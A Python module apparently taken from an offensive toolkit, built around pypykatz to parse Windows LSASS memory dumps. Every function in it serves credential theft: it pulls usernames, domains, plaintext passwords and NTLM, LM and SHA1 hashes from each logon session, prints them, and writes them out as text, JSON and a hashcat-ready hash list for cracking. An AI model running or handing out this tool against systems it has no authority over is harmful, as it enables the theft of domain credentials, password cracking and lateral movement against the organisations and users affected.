#!/usr/bin/env python3
"""
Parse LSASS dumps and extract credentials using pypykatz
"""

from pathlib import Path
from typing import List, Dict, Optional
import json


class PyPykatzParser:
    """
    Parse LSASS dump files and extract credentials
    Uses pypykatz library for parsing
    """
    
    def __init__(self):
        """Initialize parser"""
        self.pypykatz = None
        self._check_pypykatz()
    
    def _check_pypykatz(self):
        """Check if pypykatz is available"""
        try:
            from pypykatz.pypykatz import pypykatz
            self.pypykatz = pypykatz
            return True
        except ImportError:
            return False
    
    def is_available(self) -> bool:
        """Check if parser is available"""
        return self.pypykatz is not None
    
    def parse_dump(self, dump_file: str) -> Optional[List[Dict]]:
        """
        Parse LSASS dump file and extract credentials
        
        Args:
            dump_file: Path to dump file
            
        Returns:
            List of credential dictionaries or None on failure
        """
        if not self.is_available():
            print(f"[-] pypykatz not installed")
            print(f"[!] Install: pip install pypykatz")
            return None
        
        print(f"\n[*] Parsing LSASS dump with pypykatz...")
        print(f"[*] Dump file: {dump_file}")
        
        try:
            # Parse minidump
            mimi = self.pypykatz.parse_minidump_file(dump_file)
            
            # Extract credentials from all logon sessions
            credentials = []
            
            for luid in mimi.logon_sessions:
                session = mimi.logon_sessions[luid]
                
                # Process each credential type in the session
                for cred_type, creds in session.credentials.items():
                    for cred in creds:
                        cred_info = {
                            'username': session.username,
                            'domain': session.domainname,
                            'luid': luid,
                            'type': cred_type,
                            'logon_type': session.logon_type.name if hasattr(session, 'logon_type') else 'Unknown'
                        }
                        
                        # Extract password if available
                        if hasattr(cred, 'password') and cred.password:
                            cred_info['password'] = cred.password
                        
                        # Extract NTLM hash if available
                        if hasattr(cred, 'NThash') and cred.NThash:
                            cred_info['nthash'] = cred.NThash.hex()
                        
                        # Extract LM hash if available
                        if hasattr(cred, 'LMhash') and cred.LMhash:
                            cred_info['lmhash'] = cred.LMhash.hex()
                        
                        # Extract SHA1 if available
                        if hasattr(cred, 'SHA1') and cred.SHA1:
                            cred_info['sha1'] = cred.SHA1.hex()
                        
                        credentials.append(cred_info)
            
            print(f"[+] Extracted {len(credentials)} credentials from {len(mimi.logon_sessions)} logon sessions")
            
            return credentials
        
        except Exception as e:
            print(f"[-] Parse failed: {e}")
            return None
    
    def display_credentials(self, credentials: List[Dict]):
        """
        Display extracted credentials in readable format
        
        Args:
            credentials: List of credential dictionaries
        """
        if not credentials:
            print(f"\n[-] No credentials found")
            return
        
        print(f"\n" + "="*70)
        print(f"EXTRACTED CREDENTIALS")
        print(f"="*70)
        
        # Group by username
        by_user = {}
        for cred in credentials:
            key = f"{cred.get('domain', '')}\\{cred.get('username', '')}"
            if key not in by_user:
                by_user[key] = []
            by_user[key].append(cred)
        
        # Display grouped credentials
        for i, (user, user_creds) in enumerate(by_user.items(), 1):
            print(f"\n[{i}] {user}")
            print(f"    Logon Sessions: {len(user_creds)}")
            
            # Show unique credential types
            for cred in user_creds:
                print(f"    Type: {cred.get('type', 'Unknown')}")
                
                if 'password' in cred and cred['password']:
                    print(f"    Password: {cred['password']}")
                
                if 'nthash' in cred and cred['nthash']:
                    print(f"    NTLM: {cred['nthash']}")
                
                if 'lmhash' in cred and cred['lmhash']:
                    print(f"    LM: {cred['lmhash']}")
                
                if 'sha1' in cred and cred['sha1']:
                    print(f"    SHA1: {cred['sha1']}")
    
    def save_credentials(self, credentials: List[Dict], output_file: str, format: str = 'text'):
        """
        Save credentials to file
        
        Args:
            credentials: List of credential dictionaries
            output_file: Output file path
            format: Output format ('text', 'json', 'hashcat')
        """
        output_path = Path(output_file)
        
        if format == 'json':
            # Save as JSON
            with open(output_path, 'w') as f:
                json.dump(credentials, f, indent=2)
            
            print(f"[+] Credentials saved to: {output_path} (JSON format)")
        
        elif format == 'hashcat':
            # Save in hashcat format (username:hash)
            with open(output_path, 'w') as f:
                for cred in credentials:
                    user = f"{cred.get('domain', '')}\\{cred.get('username', '')}"
                    
                    if 'nthash' in cred and cred['nthash']:
                        f.write(f"{user}:{cred['nthash']}\n")
            
            print(f"[+] Hashes saved to: {output_path} (Hashcat format)")
        
        else:
            # Save as plain text
            with open(output_path, 'w') as f:
                for cred in credentials:
                    user = f"{cred.get('domain', '')}\\{cred.get('username', '')}"
                    
                    f.write(f"User: {user}\n")
                    f.write(f"Type: {cred.get('type', 'Unknown')}\n")
                    
                    if 'password' in cred and cred['password']:
                        f.write(f"Password: {cred['password']}\n")
                    
                    if 'nthash' in cred and cred['nthash']:
                        f.write(f"NTLM: {cred['nthash']}\n")
                    
                    if 'lmhash' in cred and cred['lmhash']:
                        f.write(f"LM: {cred['lmhash']}\n")
                    
                    f.write("\n")
            
            print(f"[+] Credentials saved to: {output_path} (Text format)")
    
    def parse_and_display(self, dump_file: str, save_to: Optional[str] = None):
        """
        Parse dump file and display credentials
        Optionally save to file
        
        Args:
            dump_file: Path to dump file
            save_to: Optional output file path
            
        Returns:
            List of credentials or None
        """
        # Parse dump
        credentials = self.parse_dump(dump_file)
        
        if not credentials:
            return None
        
        # Display credentials
        self.display_credentials(credentials)
        
        # Save if requested
        if save_to:
            # Determine directory from dump file
            dump_path = Path(dump_file)
            output_dir = dump_path.parent
            
            # Save in multiple formats
            base_name = Path(save_to).stem
            
            self.save_credentials(
                credentials,
                output_dir / f"{base_name}.txt",
                format='text'
            )
            
            self.save_credentials(
                credentials,
                output_dir / f"{base_name}.json",
                format='json'
            )
            
            self.save_credentials(
                credentials,
                output_dir / f"{base_name}_hashes.txt",
                format='hashcat'
            )
        
        return credentials
